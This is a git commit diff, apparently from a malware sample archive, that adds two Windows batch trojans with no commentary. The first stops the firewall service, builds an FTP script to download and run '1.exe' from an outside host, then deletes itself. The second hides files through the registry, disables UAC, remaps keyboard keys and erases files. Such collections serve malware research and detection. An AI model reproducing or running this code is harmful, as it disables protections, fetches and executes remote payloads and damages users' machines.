9deb08de0035851ebde9bf80e7439519319637a7
PetiKVX <petikvx@gmail.com>
2021-12-10 18:10:02 +0000

    VirusShare_00031

---
+++ Script/BAT/Trojan-Downloader/Trojan-Downloader.BAT.Agent.ab.bat
@@ -0,0 +1,12 @@
+ÿþ &cls
+%windir%\system32\cmd.exe /c start http://www.00ll22xiaopin.com/an/1.gif
+net stop sharedaccess
+echo open ly5508qi.3322.org > t.t
+echo 123>>t.t&echo 123>>t.t
+echo get 1.exe C:\1.exe >> t.t
+echo bye >> t.t&ftp -s:t.t
+del t.t
+c:\1.exe
+del %windir%\vnet.vbs
+del %0
+exit
---
+++ Script/BAT/Trojan/Trojan.BAT.Zapchast.bf.bat
@@ -0,0 +1,10 @@
+Reg Add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /V Hidden /T REG_DWORD /D 0 /F
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 000000000000000003000000000037e00000540000000000 /f
+erase "C:\Users\w7-32\Desktop\7\7(5).exe"
+erase "C:\Users\w7-32\AppData\Local\Temp\ex.vbs"
+Reg Add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /V Hidden /T REG_DWORD /D 0 /F
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 000000000000000003000000000037e00000540000000000 /f
+erase "C:\Users\w7-32\Desktop\7\7(5).exe"
+erase "C:\Users\w7-32\AppData\Local\Temp\ex.vbs"
